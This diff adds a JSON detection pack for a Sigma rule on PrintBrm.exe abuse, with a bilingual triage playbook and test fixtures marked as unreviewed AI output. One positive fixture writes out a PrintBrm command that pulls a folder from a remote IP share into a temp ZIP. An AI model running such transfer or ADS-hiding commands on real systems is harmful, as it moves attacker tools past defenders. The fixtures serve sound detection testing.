@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "cafeeba3-01da-4ab4-b6c4-a31b1d9730c7",
+    "title": "PrintBrm ZIP Creation of Extraction",
+    "level": "high",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_lolbin_printbrm.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1564.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó PrintBrm.exe, la herramienta de migración de impresoras de Windows, con la opción -f y un archivo .zip. Esto suele indicar que se usa como LOLBIN para comprimir o extraer archivos y no para migrar impresoras.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\PrintBrm.exe y CommandLine contiene ' -f' y '.zip'. El uso legítimo normalmente trabaja con archivos .printerExport y no con ZIP.",
+      "why_it_matters": "PrintBrm.exe está firmado por Microsoft y puede empaquetar una carpeta, incluso desde un recurso compartido remoto, o extraer un ZIP, también a Alternate Data Streams. Así permite transferir herramientas (T1105) u ocultar datos en ADS (T1564.004) sin binarios de terceros.",
+      "triage_steps": [
+        "Revise CommandLine: -b indica creación del ZIP, -r indica extracción; anote las rutas de -d y -f, sobre todo rutas UNC o con ':' que apunten a un ADS.",
+        "Verifique que Image sea C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe y compare su hash con el binario legítimo de Microsoft.",
+        "Analice ParentImage y la línea de comandos del padre; cmd.exe, powershell.exe, wscript.exe o procesos de Office son sospechosos.",
+        "Identifique el usuario y si el host es servidor de impresión o una estación de trabajo normal.",
+        "Si -d apunta a una ruta UNC, valide la IP o el host remoto y busque conexiones SMB del mismo host en +/- 15 minutos.",
+        "Revise archivos creados en la ruta de destino, incluidos ADS, y los procesos hijos o ejecuciones posteriores desde esas rutas.",
+        "Busque alertas previas para el mismo host, usuario y origen remoto, y otras ejecuciones de PrintBrm.exe en el entorno."
+      ],
+      "false_positives": [
+        "Administradores que respaldan o migran colas de impresión en servidores de impresión y nombran el archivo de exportación con extensión .zip.",
+        "Scripts de despliegue o migración de impresoras documentados que usan PrintBrm.exe con archivos ZIP."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de impresión si la ejecución estaba autorizada y en un ventana de cambio.",
+        "Si no se puede justificar, aísle el endpoint y preserve el ZIP, el contenido extraído y los ADS para su análisis.",
+        "Bloquee la IP o el recurso compartido remoto involucrado y busque el mismo hash o las mismas rutas en otros hosts.",
+        "Elimine los artefactos maliciosos confirmados, restablezca credenciales si hubo uso indebido y considere restringir PrintBrm.exe en estaciones de trabajo con AppLocker o WDAC."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque PrintBrm.exe con ZIP casi nunca aparece en estaciones normales y permite transferir u ocultar payloads con un binario confiable."
+    },
+    "en": {
+      "summary": "PrintBrm.exe, the Windows printer migration tool, ran with the -f option and a .zip file. This usually means it is being abused as a LOLBIN to create or extract archives rather than migrate printers.",
+      "what_it_detects": "Process creation events where Image ends with \\PrintBrm.exe and CommandLine contains both ' -f' and '.zip'. Legitimate use normally works with .printerExport files, not ZIPs.",
+      "why_it_matters": "PrintBrm.exe is Microsoft-signed and can pack a folder, even from a remote share, or extract a ZIP, including into Alternate Data Streams. That enables tool transfer (T1105) and hiding data in ADS (T1564.004) without third-party binaries.",
+      "triage_steps": [
+        "Read CommandLine: -b means backup (ZIP creation), -r means restore (extraction); note the -d and -f paths, especially UNC paths or ':' pointing to an ADS.",
+        "Confirm Image is C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe and compare its hash to the genuine Microsoft binary.",
+        "Inspect ParentImage and its command line; cmd.exe, powershell.exe, wscript.exe or Office processes are suspicious.",
+        "Identify the user and whether the host is a print server or an ordinary workstation.",
+        "If -d is a UNC path, validate the remote host or IP and look for SMB connections from this host within +/- 15 minutes.",
+        "Review files written to the destination, including ADS, and any processes later launched from those paths.",
+        "Search for earlier alerts on the same host, user and remote source, and other PrintBrm.exe executions across the estate."
+      ],
+      "false_positives": [
+        "Administrators backing up or migrating print queues on print servers who name the export file with a .zip extension.",
+        "Documented printer deployment or migration scripts that call PrintBrm.exe with ZIP files."
+      ],
+      "response_steps": [
+        "Confirm with the user or print team whether the run was authorized and within a change window.",
+        "If unexplained, isolate the endpoint and preserve the ZIP, extracted content and any ADS for analysis.",
+        "Block the remote IP or share involved and hunt for the same hash or paths on other hosts.",
+        "Remove confirmed malicious artifacts, reset credentials if misused, and consider restricting PrintBrm.exe on workstations with AppLocker or WDAC."
+      ],
+      "severity_rationale": "High fits because PrintBrm.exe handling ZIPs is very rare on normal workstations and lets attackers move or hide payloads using a trusted binary."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PrintBrm.exe packs a remote share folder into a ZIP in the user's temp directory",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe",
+          "CommandLine": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\198.51.100.20\\share\\tools -f C:\\Users\\jperez\\AppData\\Local\\Temp\\data.zip",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "OriginalFileName": "PrintBrm.exe"
+        }
+      },
+      {
+        "description": "PrintBrm.exe extracts a ZIP into a public folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe",
+          "CommandLine": "PrintBrm.exe -r -f C:\\Users\\Public\\update.zip -d C:\\Users\\Public\\out",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PrintBrm.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate printer backup on a print server using a .printerExport file (no .zip)",
+        "event": {
+          "EventID": 1,
+          "Computer": "PRINT-01.andes.example.com",
+          "User": "ANDES\\adm_print",
+          "Image": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe",
+          "CommandLine": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -f D:\\Backups\\PRINT-01.printerExport",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "PrintBrm.exe"
+        }
+      },
+      {
+        "description": "Different binary (tar.exe) creating a ZIP with -f, Image does not end with PrintBrm.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\tar.exe",
+          "CommandLine": "tar.exe -a -c -f C:\\Users\\jperez\\Documents\\report.zip report",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "bsdtar"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
